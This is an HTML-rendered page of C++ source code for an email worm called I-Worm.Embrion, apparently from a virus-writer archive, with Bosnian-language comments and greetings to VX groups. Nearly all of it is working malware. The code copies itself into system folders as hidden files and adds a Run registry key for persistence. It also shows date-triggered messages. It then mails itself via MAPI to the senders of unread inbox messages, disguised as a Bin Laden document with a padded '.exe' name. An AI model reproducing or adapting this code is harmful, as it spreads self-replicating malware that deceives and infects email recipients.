<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Kadra - I-Worm.Embrion.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//-----------------------------------------------------
// Projekat Sintesys [ SPECIES VL ]
//--------------------------------------------------------
</span><span class="sc0">
</span><span class="sc2">// I-Worm.Embrion by Specie
</span><span class="sc0">
</span><span class="sc1">/* Kao prvo ovo je moj prvi projekat u jednom globalnom
    projektu koji nosi naziv Projekat Sintesys.
*/</span><span class="sc0">

</span><span class="sc1">/*
    Karakteristike crva:
   -------------------------------------------------------
   OS:               Win9x,NT,2K.
   Kompajler:        Borland C++ 5.0

   Ukratko receno crv se kopira u Win i Sys direktorij.
   Izvrsnu datoteku koju kopira u Sys direktorij crv
   koristi za "spridanje" na sve email adrese koje nadje
   u Inbox-u, dok onu koju je iskopirao u Win direktorij
   registruje u Run kljuc, tako da se starta pri svakom
   podizanju sistema. Prije "spridanja" crv odspava u
   memoriji 2 minute. Nema infektivnih metoda, niti nekih
   posebnih destruktivnih procedura. 

   Sto se tice payload funkcija startaju se tokom cijelog
   Septembra time sto pokazuje poruku na sredini ekrana.
   Druga payload funkcija jeste da svakog Utorka u sedmici
   prikaze poruku sa njenim pripadajucim sadrzajem.

   Naravno, datoteke koje iskopira imaju Hidden atribute.
   -------------------------------------------------------

   OUTRO:

   Pozdravljam ovom prilikom svog kolegu AciDCookie-a,
   te naravno VX grupe kao sto su: 29A,SMF,BCVCG,Mions...
   Greetz to:
   GriYo, Vecna, RoadKill, Black_Cat, Perikles, SnowBlaze,
   GigaByte, Walrus, Smoothie, KnowDeth, LysKovick, f0re,
   BumbleBee, Benny, NexusCrus, gl_storm, PanoiX...
   and to all other ppl on #vxer and #vxtrader...
   Spec. greetz to BiHNet.ORG [ www.bihnet.org ]
*/</span><span class="sc0">


</span><span class="sc9">#include "windows.h"
#include "mapi.h"
#include "memory.h"
</span><span class="sc0">

</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mSend</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">login</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPLHANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mNext</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mRead</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpMapiMessage</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">LoginOff</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mFree</span><span class="sc10">)(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc10">,</span><span class="sc11">HINSTANCE</span><span class="sc10">,</span><span class="sc11">LPSTR</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//--------------------------------------------------------------------------------------
// neke initijalizacije potrebne za daljnje izvrsavanje koda
//--------------------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc11">HDC</span><span class="sc0">                 </span><span class="sc11">dc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0">      </span><span class="sc11">vrm</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HINSTANCE</span><span class="sc0">       </span><span class="sc11">hndMejl</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0">                </span><span class="sc11">runKljuc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">LHANDLE</span><span class="sc0">         </span><span class="sc11">sesija</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">vIme</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc0">
     </span><span class="sc11">windir</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc0">
     </span><span class="sc11">sysdir</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc0">
     </span><span class="sc11">poruka</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Kad sve izgleda da umire,...ono se ustvari radja!"</span><span class="sc10">,</span><span class="sc0">
     </span><span class="sc11">mID</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">bPoruka</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc0">
     </span><span class="sc11">adresa</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc11">MapiMessage</span><span class="sc0">     </span><span class="sc10">*</span><span class="sc11">m</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MSG</span><span class="sc0">                  </span><span class="sc11">mPo</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//--------------------------------------------------------------------------------------
// entry-point: pocetak svega nevaljalog...;)
//--------------------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hint</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hprev</span><span class="sc10">,</span><span class="sc0">
                   </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lp</span><span class="sc10">,</span><span class="sc0">
                   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">CShow</span><span class="sc10">)</span><span class="sc0">

</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hint</span><span class="sc10">,</span><span class="sc11">vIme</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">);</span><span class="sc0">                           </span><span class="sc2">// puno ime i prezime virusa! ;)
</span><span class="sc0">
                                                                        
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">));</span><span class="sc0">             </span><span class="sc2">// ...do Windows direktorija!
</span><span class="sc0">   </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sysdir</span><span class="sc10">));</span><span class="sc0">               </span><span class="sc2">// ...do System direktorija!
</span><span class="sc0">
                                                                   </span><span class="sc1">/* ovdje kopiramo potrebne
                                                                    stringove zbog CopyFile
                                                                               API funkcije...*/</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc6">"\\Win32Dlw.EXE"</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc6">"\\Win32Exp.EXE"</span><span class="sc10">);</span><span class="sc0">

   </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">vIme</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">                                 </span><span class="sc2">// kopiraj Virus u Win direktorij
</span><span class="sc0">   </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">vIme</span><span class="sc10">,</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">                                 </span><span class="sc2">// kopiraj Virus u Sys direktorij
</span><span class="sc0">   </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">// sakrij me....
</span><span class="sc0">   </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">// sakrij i mene, ba!
</span><span class="sc0">
                                                         </span><span class="sc1">/* ..eeeee sad malo Regea slusamo
                                                            i plesemo uz njega...LOL    */</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_WRITE</span><span class="sc10">,&amp;</span><span class="sc11">runKljuc</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">runKljuc</span><span class="sc10">,</span><span class="sc6">"RunExplorer"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">runKljuc</span><span class="sc10">);</span><span class="sc0">
                                                         </span><span class="sc1">/* ovdje ide payload...
                                                           provjera sistemskog vremena...
                                                                            te payload funkcije ujedno...*/</span><span class="sc0">
                                                            
   </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">vrm</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vrm</span><span class="sc10">.</span><span class="sc11">wMonth</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">dc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDC</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dc</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
         </span><span class="sc11">TextOut</span><span class="sc10">(</span><span class="sc11">dc</span><span class="sc10">,</span><span class="sc4">300</span><span class="sc10">,</span><span class="sc4">300</span><span class="sc10">,</span><span class="sc11">poruka</span><span class="sc10">,</span><span class="sc4">49</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">ReleaseDC</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">dc</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vrm</span><span class="sc10">.</span><span class="sc11">wDayOfWeek</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"Moja jutra su sve jasnija, \n"</span><span class="sc0">
                         </span><span class="sc6">"Moja snaga je prodornija,  \n"</span><span class="sc0">
                      </span><span class="sc6">"Moje rijeci silno odjekuju,\n"</span><span class="sc0">
                      </span><span class="sc6">"Moj mac je ostriji,        \n"</span><span class="sc0">
                      </span><span class="sc6">"Moje noci su sve hladnije. \n"</span><span class="sc0">
                      </span><span class="sc6">"...ali dan je blizi kad ce \n"</span><span class="sc0">
                      </span><span class="sc6">"ljudi shvatiti da su samo, \n"</span><span class="sc0">
                      </span><span class="sc6">"i nista drugo nego ono sto \n"</span><span class="sc0">
                      </span><span class="sc6">"sam i JA!"</span><span class="sc10">,</span><span class="sc6">"..."</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
    
                                                                        </span><span class="sc1">/* sad malo prelazimo na mail funkcije
                                                                            znate i sami kako to biva...;)  */</span><span class="sc0">

</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">60000</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">                                                     </span><span class="sc2">// prvo malo odspavaj (2 min.)
</span><span class="sc0">

</span><span class="sc11">hndMejl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">                     </span><span class="sc2">// ucitavamo MAPI32.DLL...
</span><span class="sc0">
                                                                            </span><span class="sc1">/* ovdje ucitavamo neke API funkcije
                                                                                koje su nam potrebne za mail propagiranje crva */</span><span class="sc0">

</span><span class="sc11">login</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hndMejl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">LoginOff</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hndMejl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogoff"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mNext</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hndMejl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFindNext"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mRead</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hndMejl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIReadMail"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mSend</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hndMejl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mFree</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hndMejl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFreeBuffer"</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc11">login</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_NEW_SESSION</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">sesija</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// logujemo se...
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mNext</span><span class="sc10">(</span><span class="sc11">sesija</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_UNREAD_ONLY</span><span class="sc10">,</span><span class="sc0">
         </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">mID</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0">                       </span><span class="sc2">// nadjemo prvu adresu....
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mRead</span><span class="sc10">(</span><span class="sc11">sesija</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">mID</span><span class="sc10">,</span><span class="sc11">MAPI_SUPPRESS_ATTACH</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
   </span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">m</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0">                     </span><span class="sc2">// procitamo je....
</span><span class="sc0">   </span><span class="sc11">SetThreadPriority</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">THREAD_PRIORITY_HIGHEST</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// prioritetnost procesa je na nivou ;)
</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">adresa</span><span class="sc10">,</span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc6">"Bin Ladenov zivot"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc6">"Ako jos do sada niste znali ko je Bin Laden onda\n"</span><span class="sc0">
                            </span><span class="sc6">"vjerovatno cete naci ovaj dokument interesantnim\n"</span><span class="sc0">
                     </span><span class="sc6">"u kojem je prikazano nekoliko vaznih momenata u\n"</span><span class="sc0">
                     </span><span class="sc6">"u njegovom zivotu, cak dok je jos radio pri CIA!"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpszMessageType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpszDateReceived</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpszConversationID</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc11">MAPI_UNREAD</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">adresa</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">nPosition</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">vIme</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc6">"Bin Ladenov Zivot                              .exe"</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// kud ce extenzija, Boze dragi?
</span><span class="sc0">    </span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpFileType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mSend</span><span class="sc10">(</span><span class="sc11">sesija</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">                     </span><span class="sc2">// onda napravimo poruku i posaljemo je...
</span><span class="sc0">   </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mNext</span><span class="sc10">(</span><span class="sc11">sesija</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">mID</span><span class="sc10">,</span><span class="sc11">MAPI_UNREAD_ONLY</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">mID</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">);</span><span class="sc0">                   </span><span class="sc2">// radi ovako sve dok ima adresa...
</span><span class="sc0">
                                                                            </span><span class="sc1">/* ovdje oslobadjamo memoriju
                                                                                da je glava ne zaboli   */</span><span class="sc0">

</span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mFree</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">LoginOff</span><span class="sc10">(</span><span class="sc11">sesija</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">hndMejl</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                                                </span><span class="sc2">// ...to be continued! ;)
</span><span class="sc10">}</span><span class="sc0">





</span></div></body>
</html>
